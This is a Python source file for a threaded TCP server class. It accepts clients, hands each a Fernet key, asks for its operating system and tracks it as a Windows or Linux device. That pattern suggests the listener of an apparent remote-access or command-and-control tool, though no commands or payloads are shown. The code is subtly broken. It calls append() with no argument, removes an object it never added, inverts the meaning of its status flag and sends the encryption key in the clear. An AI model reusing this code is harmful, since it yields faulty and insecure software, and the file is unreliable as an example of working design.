from globals import *
from Devices import *
class SOCKET():
    def __init__(self, address, port):
        self.connections = []
        self.address = address
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.stopped = False
        self.start()
    def decrypt(self, data):
        # Decrypt the data
        return self.fernet.decrypt(data).decode()

    def encrypt(self, data):
        # Encrypt the data
        return self.fernet.encrypt(data.encode())

    def refresh_connections(self):
        # Check if the connections are still alive
        while True:
            # Check if Server is stopped
            if self.stopped:
                break
            for conn in self.connections:
                try:
                    conn.conn.send(self.encrypt("alive:alive"))
                except:
                    self.connections.remove(conn)
                    log(f"Connection from {conn.addr} has been lost.", alert="error")
            time.sleep(10)


    def listen(self):
        while True:
            # Check if Server stopped
            if self.stopped:
                break
            try:
                conn, addr = self.server.accept()
            except Exception as e:
                logging.error(e)
                exit()
            else:
                ph_print(f"New Connection established from {addr[0]}:{addr[1]}")
                logging.info(f"New Connection established from {addr}")
                self.connections.append()
                conn.send(self.key)
                operating_system = self.decrypt(conn.recv(1024))
                if operating_system == "windows":
                    self.connections.append(Windows(conn, addr))
                elif operating_system == "linux":
                    self.connections.append(Linux(conn, addr))
                else:
                    log(f"Unknown Operating System: {operating_system}", alert="error")
                    logging.error(f"Unknown Operating System: {operating_system}")
                    self.connections.remove(conn)
                    conn.close()
                    continue

    def start(self):
        self.connections = []
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        ADDR = (self.address, self.port)
        try:
            self.server.bind(ADDR)
        except:
            log("Port is already in use.", alert="critical")
            raise SystemExit
        self.server.listen()
        # Start the Listener and Refresher
        self.listener = threading.Thread(target=self.listen, name="Listener")
        self.listener.start()
        self.refresher = threading.Thread(target=self.refresh_connections, name="Refresher")
        self.refresher.start()

    def stop(self):
        # Stop the Server
        self.server.shutdown(socket.SHUT_RDWR)
        self.stopped = True
    def status(self):
        """Get Status of the Server
        
        Returns:
            bool: True if socket is running, False if not
            bool: True if listener is running, False if not
            bool: True if refresher is running, False if not"""
        # Return the Status of the Server
        return self.stopped, self.listener.is_alive(), self.refresher.is_alive()
